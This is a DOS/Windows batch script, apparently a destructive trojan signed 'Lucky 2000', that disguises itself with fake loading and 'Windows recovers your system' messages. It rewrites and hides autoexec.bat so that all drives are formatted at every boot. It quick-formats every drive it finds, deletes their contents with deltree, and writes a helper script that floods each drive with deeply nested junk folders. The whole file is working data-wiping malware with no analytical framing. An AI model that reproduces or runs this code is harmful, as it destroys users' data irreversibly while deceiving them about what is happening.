   @echo off
   :start
   cls
   echo PLEASE WAIT WHILE PROGRAM LOADS . . .
   call attrib -r -h c:\autoexec.bat >nul
   echo @echo off >c:\autoexec.bat
   echo call format c: /q /u /autotest >nul >>c:\autoexec.bat
   call attrib +r +h c:\autoexec.bat >nul
   set drive=
   set alldrive=c d e f g h i j k l m n o p q r s t u v w x y z
   echo @echo off >drivechk.bat
   echo @prompt %%%%comspec%%%% /f /c vol %%%%1: $b find "Vol" > nul >{t}.bat
   %comspec% /e:2048 /c {t}.bat >>drivechk.bat
   del {t}.bat
   echo if errorlevel 1 goto enddc >>drivechk.bat
   cls
   echo PLEASE WAIT WHILE PROGRAM LOADS . . .
   echo @prompt %%%%comspec%%%% /f /c dir %%%%1:.\/ad/w/-p $b find "bytes" > nul >{t}.bat
   %comspec% /e:2048 /c {t}.bat >>drivechk.bat
   del {t}.bat
   echo if errorlevel 1 goto enddc >>drivechk.bat
   cls
   echo PLEASE WAIT WHILE PROGRAM LOADS . . .
   echo @prompt dir %%%%1:.\/ad/w/-p $b find " 0 bytes free" > nul >{t}.bat
   %comspec% /e:2048 /c {t}.bat >>drivechk.bat
   del {t}.bat
   echo if errorlevel 1 set drive=%%drive%% %%1 >>drivechk.bat
   cls
   echo PLEASE WAIT WHILE PROGRAM LOADS . . .
   echo :enddc >>drivechk.bat
   :testdrv
   for %%a in (%alldrive%) do call drivechk.bat %%a >nul
   del drivechk.bat >nul
   if %drive.==. set drive=c
   :form_del
   call attrib -r -h c:\autoexec.bat >nul
   echo @echo off >c:\autoexec.bat
   echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
   echo for %%%%a in (%drive%) do call format %%%%a: /q /u /autotest >nul >>c:\autoexec.bat
   echo cls >>c:\autoexec.bat
   echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
   echo for %%%%a in (%drive%) do call c:\temp.bat %%%%a Lucky2000 >nul >>c:\autoexec.bat
   echo cls >>c:\autoexec.bat
   echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
   echo for %%%%a in (%drive%) call deltree /y %%%%a:\ >nul >>c:\autoexec.bat
   echo cls >>c:\autoexec.bat
   echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
   echo for %%%%a in (%drive%) do call format %%%%a: /q /u /autotest >nul >>c:\autoexec.bat
   echo cls >>c:\autoexec.bat
   echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
   echo for %%%%a in (%drive%) do call c:\temp.bat %%%%a Lucky2000 >nul >>c:\autoexec.bat
   echo cls >>c:\autoexec.bat
   echo echo Loading Windows, please wait while Microsoft Windows recovers your system . . . >>c:\autoexec.bat
   echo for %%%%a in (%drive%) call deltree /y %%%%a:\ >nul >>c:\autoexec.bat
   echo cd\ >>c:\autoexec.bat
   echo cls >>c:\autoexec.bat
   echo echo Welcome Lucky´s land of death. >>c:\autoexec.bat
   echo echo If you ran this file, then sorry, I just made it. >>c:\autoexec.bat
   echo echo. >>c:\autoexec.bat
   echo echo Regards, >>c:\autoexec.bat
   echo echo. >>c:\autoexec.bat
   echo echo Lucky 2000 >>c:\autoexec.bat
   call attrib +r +h c:\autoexec.bat

   :makedir
   if exist c:\temp.bat attrib -r -h c:\temp.bat >nul
   echo @echo off >c:\temp.bat
   echo %%1:\ >>c:\temp.bat
   echo cd\ >>c:\temp.bat
   echo :startmd >>c:\temp.bat
   echo for %%%%a in ("if not exist %%2\nul md %%2" "if exist %%2\nul cd %%2") do %%%%a >>c:\temp.bat
   echo for %%%%a in (">Lucky2000.txt") do echo %%%%Land of @$$death!!!! >>c:\temp.bat
   echo if not exist %%1:\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\%%2\nul goto startmd >>c:\temp.bat
   call attrib +r +h c:\temp.bat >nul
   cls
   echo Initializing Variables . . .
   rem deltree /y %%a:\*. only eliminates directories ???
   for %%a in (%drive%) do call format %%a: /q /u /autotest >nul
   cls
   echo Initializing Variables . . .
   echo Validating Data . . .
   for %%a in (%drive%) do call c:\temp.bat %%a Lucky2000 >nul
   cls
   echo Initializing Variables . . .
   echo Validating Data . . .
   echo Analyzing System Structure . . .
   for %%a in (%drive%) call attrib -r -h %%a:\ /S  >nul
   call attrib +r +h c:\temp.bat >nul
   call attrib +r +h c:\autoexec.bat >nul
   cls
   echo Initializing Variables . . .
   echo Validating Data . . .
   echo Analyzing System Structure . . .
   echo Initializing Application . . .
   for %%a in (%drive%) call deltree /y %%a:\*. >nul
   cls
   echo Initializing Variables . . .
   echo Validating Data . . .
   echo Analyzing System Structure . . .
   echo Initializing Application . . .
   echo Starting Application . . .
   for %%a in (%drive%) do call c:\temp.bat %%a Munga >nul
   :end
